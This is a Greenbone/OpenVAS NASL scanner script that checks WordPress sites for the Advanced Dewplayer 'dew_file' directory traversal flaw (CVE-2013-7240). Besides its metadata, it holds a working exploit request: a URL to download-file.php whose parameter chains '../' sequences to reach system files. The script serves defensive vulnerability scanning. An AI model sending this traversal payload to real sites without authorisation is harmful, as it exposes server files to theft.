CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804058" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2013-7240" );
	script_bugtraq_id( 64587 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2014-01-07 16:29:23 +0530 (Tue, 07 Jan 2014)" );
	script_name( "WordPress Advanced Dewplayer 'dew_file' Directory Traversal Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with WordPress Advanced Dewplayer Plugin and is prone
to directory traversal vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request and check whether it is able to read
local file or not." );
	script_tag( name: "solution", value: "Update to WordPress Advanced Dewplayer 1.3 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "insight", value: "Flaw is due to the 'download-file.php' script not properly sanitizing user
input, specifically path traversal style attacks (e.g. '../') supplied via
the 'dew_file' parameter." );
	script_tag( name: "affected", value: "WordPress Advanced Dewplayer 1.2, Other versions may also be affected." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to read arbitrary files
on the target system." );
	script_xref( name: "URL", value: "http://secunia.com/advisories/55941" );
	script_xref( name: "URL", value: "http://seclists.org/oss-sec/2013/q4/566" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc", "os_detection.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "http://wordpress.org/plugins/advanced-dewplayer" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/wp-content/plugins/advanced-dewplayer/admin-panel" + "/download-file.php?dew_file=" + crap( data: "../", length: 3 * 15 ) + files[file];
	if(http_vuln_check( port: http_port, url: url, pattern: file )){
		security_message( port: http_port );
		exit( 0 );
	}
}

